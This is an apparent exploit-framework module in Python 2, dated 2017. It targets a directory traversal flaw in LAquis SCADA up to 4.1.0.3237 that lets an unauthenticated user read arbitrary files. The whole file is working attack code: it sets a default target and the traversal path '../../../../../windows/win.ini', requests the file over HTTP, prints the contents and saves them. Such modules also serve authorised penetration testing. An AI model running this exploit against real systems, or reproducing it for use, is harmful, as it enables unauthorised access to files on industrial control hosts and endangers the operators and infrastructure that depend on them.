#!/usr/bin/env python

import urllib2
import json
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_laquis_scada_directory_traversal"
INFO['DESCRIPTION'] = "LAquis SCADA <= 4.1.0.3237 Directory Traversal"
INFO['VENDOR'] = "http://laquisscada.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    Vulnerability allows unauthenticated user to read contents of arbitrary file on remote machine.
Tested against LAquis SCADA 4.1.0.3066 on Windows 7 SP1 x64.
"""
INFO["DOWNLOAD_LINK"] = "http://laquisscada.com/index-3.html"
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "4 Jul, 2017. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 1234
OPTIONS["FILENAME"] = "../../../../../windows/win.ini"


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])

    def make_url(self, path=''):
        url = "http://%s:%s/%s" % (self.host, self.port, path)
        return url

    def check(self):
        url = self.make_url()
        self.log('[*] Checking %s' % url)
        try:
            urllib2.urlopen(url)
        except:
            self.log('[-] Can\'t connect to %s' % url)
            self.finish(True)


    def run(self):
        # Get options from gui
        self.args()
        self.check()
        self.log('[*] Trying to get contents of %s' % self.filename)
        url = self.make_url(urllib2.quote(self.filename))
        resp = urllib2.urlopen(url)
        if resp.code != 200:
            self.log("File is not exists")
            self.finish(False)
        content = resp.read()
        if len(content) < 10000:
            self.log('[+]\r\n' + content)
        self.writefile(content)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()